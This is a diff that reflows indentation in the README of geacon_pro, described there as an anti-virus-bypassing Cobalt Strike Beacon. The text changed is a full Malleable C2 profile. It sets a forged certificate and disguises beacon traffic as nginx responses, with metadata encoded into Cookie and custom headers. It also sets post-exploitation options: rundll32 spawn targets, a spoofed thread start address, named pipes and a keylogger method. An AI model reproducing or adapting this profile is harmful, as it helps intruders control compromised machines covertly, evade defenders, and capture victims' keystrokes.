@@ -5,7 +5,7 @@
 
 
 ## Introduction
-geacon_pro is an Anti-Virus bypassing CobaltStrike Beacon written in Golang based on  [geacon](https://github.com/darkr4y/geacon) project. 
+geacon_pro is an Anti-Virus bypassing CobaltStrike Beacon written in Golang based on  [geacon](https://github.com/darkr4y/geacon) project.
 
 geacon_pro supports CobaltStrike version 4.1+
 
@@ -67,105 +67,105 @@ geacon_pro adapts the settings on the flow of C2profile and some settings on the
 set sleeptime "3000";
 
 https-certificate {
-    set C "KZ";
-    set CN "foren.zik";
-    set O "NN Fern Sub";
-    set OU "NN Fern";
-    set ST "KZ";
-    set validity "365";
+set C "KZ";
+set CN "foren.zik";
+set O "NN Fern Sub";
+set OU "NN Fern";
+set ST "KZ";
+set validity "365";
 }
 
 # define indicators for an HTTP GET
 http-get {
 
-	set uri "/www/handle/doc";
+set uri "/www/handle/doc";
 
-	client {
-		#header "Host" "aliyun.com";
-		# base64 encode session metadata and store it in the Cookie header.
-		metadata {
+client {
+#header "Host" "aliyun.com";
+# base64 encode session metadata and store it in the Cookie header.
+metadata {
 			base64url;
-			prepend "SESSIONID=";
-			header "Cookie";
-		}
+prepend "SESSIONID=";
+header "Cookie";
+}
 	}
 
 	server {
 		# server should send output with no changes
-		#header "Content-Type" "application/octet-stream";
-		header "Server" "nginx/1.10.3 (Ubuntu)";
-    		header "Content-Type" "application/octet-stream";
-        	header "Connection" "keep-alive";
-        	header "Vary" "Accept";
-        	header "Pragma" "public";
-        	header "Expires" "0";
-        	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
+#header "Content-Type" "application/octet-stream";
+header "Server" "nginx/1.10.3 (Ubuntu)";
+header "Content-Type" "application/octet-stream";
+header "Connection" "keep-alive";
+header "Vary" "Accept";
+header "Pragma" "public";
+header "Expires" "0";
+header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
 
-		output {
+output {
 			mask;
-			netbios;
-			prepend "data=";
-			append "%%";
-			print;
-		}
+netbios;
+prepend "data=";
+append "%%";
+print;
+}
 	}
 }
 
 # define indicators for an HTTP 
 http-post {
 	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
-	set uri "/IMXo";
-	client {
-		#header "Content-Type" "application/octet-stream";				
+set uri "/IMXo";
+client {
+#header "Content-Type" "application/octet-stream";
 
-		# transmit our session identifier as /submit.php?id=[identifier]
-		
-		id {				
+# transmit our session identifier as /submit.php?id=[identifier]
+
+id {				
 			mask;
-			netbiosu;
-			prepend "user=";
-			append "%%";
-			header "User";
-		}
+netbiosu;
+prepend "user=";
+append "%%";
+header "User";
+}
 
 		# post our output with no real changes
 		output {
 			mask;
-			base64url;
-			prepend "data=";
-			append "%%";		
-			print;
-		}
+base64url;
+prepend "data=";
+append "%%";
+print;
+}
 	}
 
 	# The server's response to our HTTP POST
 	server {
 		header "Server" "nginx/1.10.3 (Ubuntu)";
-    		header "Content-Type" "application/octet-stream";
-        	header "Connection" "keep-alive";
-       	 	header "Vary" "Accept";
-        	header "Pragma" "public";
-        	header "Expires" "0";
-        	header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
+header "Content-Type" "application/octet-stream";
+header "Connection" "keep-alive";
+header "Vary" "Accept";
+header "Pragma" "public";
+header "Expires" "0";
+header "Cache-Control" "must-revalidate, post-check=0, pre-check=0";
 
 		# this will just print an empty string, meh...
-		output {
+output {
 			mask;
-			netbios;
-			prepend "data=";
-			append "%%";
-			print;
-		}
+netbios;
+prepend "data=";
+append "%%";
+print;
+}
 	}
 }
 
 post-ex {
-    set spawnto_x86 "c:\\windows\\syswow64\\rundll32.exe";
-    set spawnto_x64 "c:\\windows\\system32\\rundll32.exe";
-    
-    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
-    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
-    set keylogger "SetWindowsHookEx";
+set spawnto_x86 "c:\\windows\\syswow64\\rundll32.exe";
+set spawnto_x64 "c:\\windows\\system32\\rundll32.exe";
+
+set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
+set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
+set keylogger "SetWindowsHookEx";
 }
 
 ```
